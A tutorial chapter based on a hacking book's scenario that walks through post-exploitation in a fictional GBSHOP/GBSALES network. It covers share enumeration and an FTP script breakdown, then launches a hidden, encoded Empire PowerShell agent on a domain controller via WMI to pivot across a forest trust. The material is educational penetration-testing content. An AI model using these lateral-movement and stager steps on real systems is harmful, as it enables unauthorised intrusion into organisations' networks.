# Empire: abusing trust

*Note: this section continues from the previous cookbook on kerberos golden ticket and follows demonstrations from the book "How to Hack Like a GOD: Master the Secrets of Hacking Through Real Life Scenarios" (continuing from page no. 84)*

Current situation recap regarding everything we have done so far:

- Using the MS16-032 exploit, we have gained an elevated PowerShell session on the Citrix server.

- We have a persistent backdoor to the Citrix server via a WMI event that executes code fetched from the attack server.

- We can issue domain admin commands on the GBSHOP domain using a Golden Ticket, which remains valid even if all passwords are reset.

- We have a Pi backdoor and an Empire agent running on one of the store’s computers, giving us additional footholds in the network.

With our strong grip on the GBSHOP domain and armed with domain admin privileges, we can now explore previously inaccessible shares to see what valuable data they contain.

To list the shared resources on the server SV0078, we use the net view command:

```
PS > net view \\SV0078 /all
```

- ```net view \\SV0078 /all:``` This command lists all shared resources on the server SV0078.

- ```net view:``` Displays a list of computers or network resources.

- ```\\SV0078:``` Specifies the target server.

- ```/all:``` Optionally lists all shares, including hidden and administrative shares.

Output explanation:

```
Shared resources at \\SV0078
Share name  Type      Used as  Comment
---------------------------------------------------
ADMIN$      Disk                Remote Admin
C$          Disk                Default share
CORP$       Disk
FTP_SALES$  Disk
HR$         Disk
IPC$        IPC                 Remote IPC
IT_Support$ Disk
```

- ADMIN$: An administrative share for remote admin tasks.

- C$: A default administrative share for the C: drive.

- CORP$: A custom shared folder, likely containing corporate data.

- FTP_SALES$: A shared folder, probably used for sales-related data via FTP.

- HR$: A shared folder, likely containing human resources data.

- IPC$: An inter-process communication share used for remote IPC. This a mechanism that allows processes (running programs) to communicate with each other and synchronize their actions. In the context of Windows networks, IPC is often used for remote administration and resource sharing, allowing processes on different machines to communicate efficiently. The IPC$ share specifically is a hidden share used for this type of communication, often required for administrative tasks like remote management or accessing other shared resources.

- IT_Support$: A shared folder, likely containing IT support-related data.

Note: to check access or interact with a specific share, you might use a different command, such as dir to list contents or net use to map the share:

```
PS > net use X: \\SV0078\FTP_SALES$
```

This maps the FTP_SALES$ share to drive letter X: (if you need to access the share as a drive letter - mapping or mounting is only necessary if you need to interact with or access the share in a specific way).

```
PS > dir \\SV0078\FTP_SALES$
```

This lists the contents of the FTP_SALES$ share directly.

After accessing the FTP_SALES$ share, we only find one small script. Apparently it automates the process of uploading files from a local directory to an FTP server and then removing the local files after successful upload:

```
# Import the PSFTP module for FTP operations
Import-Module PSFTP

# Define FTP server details
$FTPServer = '10.30.30.210'
$FTPUsername = 'FTPService'

# Prompt for FTP password and secure it
$FTPPassword = $( Read-Host "Input password, please" )
$FTPSecurePassword = ConvertTo-SecureString -String $FTPPassword -AsPlainText -Force

# Create a credential object for FTP session
$FTPCredential = New-Object System.Management.Automation.PSCredential($FTPUsername, $FTPSecurePassword)

# Initialize FTP session (Assuming this part is in the omitted portion from the book)
$session = New-FTPSession -Server $FTPServer -Credential $FTPCredential

# Define local output and FTP directory paths (Assuming this part is in the omitted portion)
$local_out = "C:\Path\To\Local\Directory"
$ftp_path = "/remote/ftp/directory"

# Process and upload files to FTP, then remove local files
Get-ChildItem -Path $local_out |
% {
    $ftp_file = "$ftp_path/$($_.Name)" # Determine full FTP file path
    Add-FTPItem -Path $ftp_file -LocalPath $_.FullName -Session $session # Upload file
    Remove-item $_.FullName # Remove local file after upload
}
```

Additional breakdown:

```
Import-Module PSFTP
```

This line imports the PSFTP module, which provides cmdlets for working with FTP.

(parameters like defining FTP server details etc. are self explanatory, so we will skip that)

```
$FTPPassword = $( Read-Host "Input password, please" )
```

This line prompts the user to input the FTP password. The Read-Host cmdlet is used to capture user input.

```
$FTPSecurePassword = ConvertTo-SecureString -String $FTPPassword -AsPlainText -Force
```

The password entered by the user is converted to a secure string using ConvertTo-SecureString. The -AsPlainText and -Force parameters are necessary to convert the plain text password into a secure string. A secure string in PowerShell is an encrypted string that provides a way to store sensitive information like passwords securely. Here’s how it works in a nutshell:

- **Conversion to Secure String:** When a plain text password is converted into a secure string using ConvertTo-SecureString, it is encrypted in memory. This encryption makes it difficult for malicious actors to read the sensitive data directly from the memory.

- **Usage in Cmdlets:** Secure strings are used in cmdlets that require sensitive information, ensuring that this information is handled securely. For instance, when creating a PSCredential object, the password is required to be in a secure string format.

- **Encryption and Decryption:** PowerShell uses Windows Data Protection API (DPAPI) to encrypt and decrypt secure strings. This means that the secure string is tied to the user context and machine, providing an additional layer of security.

Here’s a brief example demonstrating the creation and use of a secure string:

```
# Convert a plain text password to a secure string
$plainTextPassword = "MySecretPassword"
$securePassword = ConvertTo-SecureString -String $plainTextPassword -AsPlainText -Force

# Create a PSCredential object using the secure string
$username = "MyUsername"
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)

# The credential object now securely stores the username and encrypted password
```

- ConvertTo-SecureString encrypts the plain text password.
  
- New-Object System.Management.Automation.PSCredential uses the secure string to create a credential object, ensuring that the password remains encrypted.

Overall, secure strings are essential for securely handling sensitive information in PowerShell scripts.

And now back to the rest of the FTP script:

```
$FTPCredential = New-Object System.Management.Automation.PSCredential($FTPUsername, $FTPSecurePassword)
```

This line creates a new credential object that stores the FTP username and secure password. This object is used to authenticate the FTP session.

```
$session = New-FTPSession -Server $FTPServer -Credential $FTPCredential
```

Although this line is inferred, it initializes a new FTP session using the server address and credentials provided. The omitted part [ ... ] in the original script likely contains:

- Initialization of $local_out (the local output directory path).

- Initialization of $ftp_path (the remote FTP directory path).

- Creation of the FTP session (possibly New-FTPSession cmdlet).

Establishing an FTP connection can be time-consuming. By using a session object, you avoid the overhead of creating a new connection for each file transfer. Instead, you create one session and reuse it for multiple operations. Using a session ensures that all operations are performed within the same authenticated context. This means that once you authenticate with the FTP server, you don’t need to re-authenticate for each command. Also, some FTP operations depend on the state of the connection (e.g., current directory, transfer mode). By using a session, you maintain the state across multiple operations, which can simplify your script.

```
Get-ChildItem -Path $local_out |
% {
    $ftp_file = "$ftp_path/$($_.Name)" # determine item fullname
    Add-FTPItem -Path $ftp_file -LocalPath $_.FullName -Session $session
    Remove-item $ftp_file
}
```

This block iterates through all items in the local output directory ($local_out).

- Get-ChildItem -Path $local_out |: Retrieves the list of items in the specified local directory. The pipe takes the collection of items retrieved by Get-ChildItem and passes each item one-by-one to the next command.

- % { ... }: A shorthand for ForEach-Object, it processes each item.

- $ftp_file = "$ftp_path/$($_.Name)": Constructs the full FTP path for each file.

- Add-FTPItem -Path $ftp_file -LocalPath $_.FullName -Session $session: Uploads the file to the FTP server.

- The -Session $session parameter in the Add-FTPItem cmdlet is used to specify the FTP session context in which the command should run.

- Remove-item $ftp_file: Deletes the file from the local directory after it has been uploaded to the FTP server.

As previously stated, this script uploads files to an FTP server. However, since the password must be input manually, we cannot access the FTP server on machine 10.30.30.210. Attempts to connect to the server over RPC (port 135) or RDP (port 3389) are blocked, indicating a tight network filter that allows only FTP connections.

The IP address 10.30.30.210 falls within the GBSales domain network, explaining why we cannot access it from the Citrix server in the GBShop domain.

```
c:\Users\Public> nslookup
Address: 10.10.20.199
GBSALES.CORP
Name:
Address: GBSALES.CORP
10.30.30.88
```

We assume that sales files from multiple shops are automatically sent by FTP to this centralized location. While we could wait for the next transfer and intercept the files before they are erased, this is a last resort.

Apart from the Citrix machine and a few file servers, there is not much activity in the GBShop domain, which primarily acts as a relay or buffer to other internal components. This setup cleverly segregates environments and protects critical assets.

Attempts to access the GBSales domain from the Citrix server result in zero response, indicating a strict separation. However, a trust relationship exists between the two forests (GBSHOP and GBSALES), allowing some connections between critical components.

Microsoft documentation specifies that the following ports must be open between domain controllers of both domains:

- 445: File transfers
- 88: Kerberos authentication
- 135: RPC communication
- 389: LDAP communications
- Dynamic ports: RPC communication

This means that to access the GBSALES department, we must go through the GBSHOP domain controller. Although executing payloads on the DC is generally not advised, we have no other choice this time.

Using WMI on the PowerShell command line from the Citrix server, we execute a remote process on the DC server to spawn an Empire agent:

```
# $cmd holds an Empire agent
PS > $cmd = "powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTA[...]"
PS > Invoke-WmiMethod -ComputerName SV0198 -Class win32_process -Name create -ArgumentList ($cmd)
```

- Invoke-WmiMethod: This cmdlet is used to invoke a method of a WMI class.

- -ComputerName SV0198: This parameter specifies the target computer on which the WMI method should be invoked. In this case, SV0198 is the name of the target computer.

- -Class win32_process: This parameter specifies the WMI class that contains the method you want to call. The win32_process is a WMI class that represents processes on a Windows system. The win32_process class is available on both 32-bit and 64-bit versions of Windows. It abstracts the details of whether the system is 32-bit or 64-bit, so you use it the same way in your WMI queries and methods. In other words, when creating a process, if you're running a 64-bit system, the create method of win32_process will still execute the command as a 64-bit process if it's available and appropriate.

- -Name create: This parameter specifies the name of the method you want to invoke. The create method of the win32_process class is used to create a new process on the target computer.

- -ArgumentList ($cmd): This parameter specifies the arguments to pass to the method. Here, ($cmd) represents the command to be executed on the target computer. $cmd should be a string containing the command you want to run, for example, "notepad.exe". Here is how it's done:

The $cmd is defined as follows:

```
$cmd = "notepad.exe"
```

The complete command would look like this:

```
PS > Invoke-WmiMethod -ComputerName SV0198 -Class win32_process -Name create -ArgumentList ($cmd)
```

This would invoke the create method of the win32_process class on the computer SV0198, resulting in notepad.exe being started on that machine.

After this short (but hopefully useful) digression, we finally receive a new agent from 10.10.20.199 (GBSHOP domain controller) connecting to our Empire handler on the attack server.

To enumerate shares on the main GBSALES Domain Controller (port 445), we use the net view command. This command allows us to see shared resources on a specified machine:

```
(Empire: DCshop) > shell "net view 10.30.30.88"
(Empire: DCshop) > 
net view 10.30.30.88
Shared resources at 10.30.30.88
---------------------------------------------------------
NETLOGON	Disk	Logon server share
SYSVOL		Disk	Logon server share
The command completed successfully.
```

- shell "command": This syntax tells Empire to execute the specified command (net view 10.30.30.88 in this case) on the target machine's command shell. Empire has its own set of built-in modules and commands. To execute a native command directly on the target's operating system, you need to prefix it with shell.

- net view 10.30.30.88: This command lists shared resources on the machine with IP address 10.30.30.88.

- NETLOGON: A shared disk used for logon purposes.

- SYSVOL: A shared disk used for system volume purposes.

As expected, we can now see some of the GBSALES resources. Because of the trust relationship between the two domains, we can query GBSALES machines using GBSHOP domain users. However, we will have standard user privileges at most. So, this calls for a new privilege escalation episode, which will be covered in the next cookbook.
